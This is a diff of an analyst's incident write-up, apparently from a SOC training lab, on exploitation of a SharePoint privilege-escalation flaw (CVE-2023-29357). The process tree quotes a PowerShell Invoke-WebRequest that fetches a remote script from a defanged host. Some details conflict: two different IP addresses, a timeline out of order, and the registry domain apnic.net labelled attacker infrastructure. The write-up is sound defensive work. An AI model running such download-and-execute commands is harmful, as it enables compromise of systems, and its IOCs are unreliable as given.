@@ -1,8 +1,8 @@
 ---
-layout: page
+layout: report
 title: "SOC227 — Microsoft SharePoint Server Elevation of Privilege"
 description: "Analyst Write-Up · CVE-2023-29357 Investigation"
-image: /assets/images/projects/sharepoint-cve.png
+image: /assets/images/sharepoint-cve.png
 tags: [sharepoint, cve-2023-29357, privilege-escalation]
 weight: 10
 ---
@@ -18,50 +18,53 @@ weight: 10
 
 ---
 
-## 1️⃣ Executive Summary
+## 1) Executive Summary
+
 On **Oct 6, 2023**, a suspicious Microsoft SharePoint Server Elevation of Privilege (**CVE-2023-29357**) was detected on host `MS-SharePointServer`.  
 Investigation confirmed the activity was **malicious**; containment actions prevented further impact.  
 No lateral movement was observed.
 
 ---
 
-## 2️⃣ Incident Details
+## 2) Incident Details
 
-| Field | Description |
-|-------|-------------|
-| **Incident ID** | 189 |
-| **Analyst** | Brandon Love |
+| Field               | Description              |
+|---------------------|--------------------------|
+| **Incident ID**     | 189                      |
+| **Analyst**         | Brandon Love             |
 | **Date/Time Detected** | Oct 6, 2023 – 08:05 PM CST |
-| **Severity** | Critical |
-| **Category** | Privilege Escalation |
-| **Detection Source** | EDR |
-| **Business Impact** | None |
-| **Systems Affected** | MS-SharePoint Server |
-| **Users Involved** | None |
+| **Severity**        | Critical                 |
+| **Category**        | Privilege Escalation     |
+| **Detection Source**| EDR                      |
+| **Business Impact** | None                     |
+| **Systems Affected**| MS-SharePoint Server     |
+| **Users Involved**  | None                     |
 
 ---
 
-## 3️⃣ Timeline of Events (CST)
-| Time | Event |
-|------|-------|
-| 20:05 | Detection triggered |
-| 09:00 | Analyst investigation started |
-| 09:20 | Root cause identified |
-| 09:30 | Containment performed |
-| 09:45 | Incident resolved |
+## 3) Timeline of Events (CST)
+
+| Time  | Event                          |
+|-------|--------------------------------|
+| 20:05 | Detection triggered            |
+| 09:00 | Analyst investigation started  |
+| 09:20 | Root cause identified          |
+| 09:30 | Containment performed          |
+| 09:45 | Incident resolved              |
 
 ---
 
-## 4️⃣ Technical Analysis
+## 4) Technical Analysis
 
 **Process Tree**
+
 ```plaintext
 explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.ps1
-
 ```
+
 **File Hashes:**  
 - SHA256: `none`  
-- MD5 (optional): `none`
+- MD5: `none`
 
 **Network Indicators:**  
 - Outbound connection to `<39.91.166.22:443>`  
@@ -69,69 +72,74 @@ explorer.exe → powershell.exe → Invoke-WebRequest http://example[.]com/file.
 
 **Host Artifacts:**  
 - Persistence: `<none>`  
-- Notable events: not enough information given
-- Screenshots / excerpts linked in Appendices
+- Notable events: not enough information given  
+- Screenshots / excerpts linked in Appendices  
 
 **MITRE ATT&CK:**  
-- T1190 – Exploit Pubic-Facing Application  
-- T1068 – Exploitation for Privilege Escalation  
+- **T1190** – Exploit Public-Facing Application  
+- **T1068** – Exploitation for Privilege Escalation  
 
 ---
 
 ## 5) Containment & Eradication (Checked = Completed)
+
 - [X] Isolated affected host  
-- [X] Elevated to Tier 2
+- [X] Elevated to Tier 2  
 - [ ] Quarantined payload / deleted artifacts  
 - [ ] Revoked creds / invalidated tokens  
 - [ ] Blocked IPs/domains/signatures across controls  
 - [ ] Removed persistence mechanisms  
-- [ ] Closed attacker sessions
+- [ ] Closed attacker sessions  
 
 ---
 
 ## 6) Recovery & Verification
+
 - [ ] Restored network access after validation  
 - [ ] Full AV/EDR scan clean  
 - [ ] Patched vulnerable components  
-- [ ] Monitored for reoccurrence for **X** hours/days
+- [ ] Monitored for reoccurrence for **X** hours/days  
 
 ---
 
 ## 7) Root Cause
-> _Explain the initiating action / vector. Add supporting evidence._  
-> Example: User executed a phishing attachment (`invoice.docm`) that downloaded and executed a PowerShell stager.
+
+> The attacker exploited an unpatched instance of Microsoft SharePoint via **CVE-2023-29357**, enabling elevation of privilege and execution of unauthorized PowerShell commands via the web service context.  
+> This vulnerability allowed the attacker to forge authentication tokens and escalate privileges without valid credentials.
 
 ---
 
 ## 8) Recommendations
-- Update and Patch Server according to Vendors Specifications  
-- Delete any new users that were added if any
-- SIEM/EDR tuning for suspicious command-line patterns  
-- URL/IP filtering for high-risk categories  
-- MFA/Conditional Access review (where relevant)
+
+- Patch SharePoint Server to remediate CVE-2023-29357  
+- Review SharePoint service accounts and remove any unauthorized additions  
+- Enable auditing on SharePoint API calls & authentication mechanisms  
+- Tune SIEM/EDR detection for unusual PowerShell & token-related events  
+- Enforce MFA for SharePoint administrative functions  
+- Validate no persistence (scheduled tasks, web shells, ASHX backdoors)  
 
 ---
 
 ## 9) Indicators of Compromise (IOCs)
-| Type | Value | Description |
-|------|------|-------------|
-| IP | 39.91.166.222 | Suspected C2 |
-| File Hash | `none` | Malicious payload |
-| URL | `http://www.apnic.net` | Download location |
-| Domain | `apnic.net` | Attacker infra |
+
+| Type      | Value                  | Description       |
+|-----------|------------------------|-------------------|
+| IP        | 39.91.166.222          | Suspected C2      |
+| File Hash | `none`                 | Malicious payload |
+| URL       | `http://www.apnic.net` | Download location |
+| Domain    | `apnic.net`            | Attacker infra    |
 
 ---
 
 ## 10) Appendices (Evidence)
+
 - Screenshots of alert console  
 - Sysmon/Windows Event excerpts  
 - PowerShell transcripts  
 - VirusTotal / sandbox results  
-- Packet captures (if applicable)
+- Packet captures (if applicable)  
 
 ---
-
-<small style="opacity:.7">© 2025 Brandon Love. Last updated: "2025-11-13 13:18".</small>
 
 <!-- Minimal in-page styles to match the site's aesthetic -->
 <style>
